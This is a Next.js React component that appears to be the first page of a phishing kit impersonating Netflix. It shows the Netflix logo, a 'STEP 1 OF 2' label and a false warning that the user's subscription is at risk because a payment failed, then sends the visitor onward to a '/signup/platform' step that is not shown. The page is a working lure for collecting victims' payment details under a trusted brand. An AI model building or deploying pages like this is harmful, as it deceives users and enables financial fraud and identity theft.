'use client'
import Image from "next/image"
import Link from "next/link"
import { Loader2 } from 'lucide-react'
import { useState, useEffect } from 'react'
import netflixIcons from "../../../public/netflix-logo.svg"
import Hold from "./hold.svg"
export default function WelcomePage() {
  const [isLoading, setIsLoading] = useState(false)

  const redirectToPage = () => {
    setIsLoading(true)
    setTimeout(() => {
      window.location.href = "/signup/platform"
    }, 1000)
  }

  useEffect(() => {
    if (isLoading) {
      document.body.style.backgroundColor = 'white'
    } else {
      document.body.style.backgroundColor = 'white'
    }
    return () => {
      document.body.style.backgroundColor = 'white'
    }
  }, [isLoading])

  return (
    <div className={`min-h-screen text-[#333333] transition-colors duration-300 ${isLoading ? 'bg-[#fffff]' : 'bg-white'}`}>
      <header className="flex justify-between items-center px-8 py-6 md:px-12 ">
        <Image
          src={netflixIcons}
          alt="Netflix"
          width={167}
          height={45}
          priority
          className="w-32 md:w-40"
        />
        <Link
          href="#"
          className="text-zinc-600 hover:underline text-lg font-medium"
        >
          Sign Out
        </Link>
      </header>

      <main className="max-w-3xl mx-auto px-10 py-12 sm:text-left md:text-center mt-24 lg:px-56">
        <div className="flex sm:justify-start md:justify-center mb-6">
          <div>
            <Image src={Hold} alt="Warning"/>
          </div>
        </div>

        <div className="space-y-4 mb-8">
          <p className="text-sm text-zinc-600">STEP 1 OF 2</p>
          <h1 className="text-lg md:text-xl font-medium text-[#333333]">
            Your subscription is at risk !
          </h1>
        </div>

        <div className="space-y-4 mb-12 sm:text-left md:text-center">
          <div className="flex  gap-2 sm:justify-start md:justify-center align-middle items-center">
          
            <p className="text-lg text-zinc-600">
            Heads up, there was a problem processing your payment. No need to worry, things happen. It’s easy to fix you’ll be watching again in no time.
            </p>
          </div>
        </div>

        <div className="flex justify-center">
          <button
            onClick={redirectToPage}
            disabled={isLoading}
            className={`w-full max-w-md h-16 text-xl bg-[#e50914] hover:bg-[#f6121d] text-white rounded-md flex items-center justify-center transition-colors duration-300 ${isLoading ? 'opacity-80' : ''}`}
          >
            {isLoading ? (
              <Loader2 className="w-6 h-6 animate-spin mr-2" />
            ) : null}
            {isLoading ? 'Loading...' : 'Next'}
          </button>
        </div>
      </main>
    </div>
  )
}

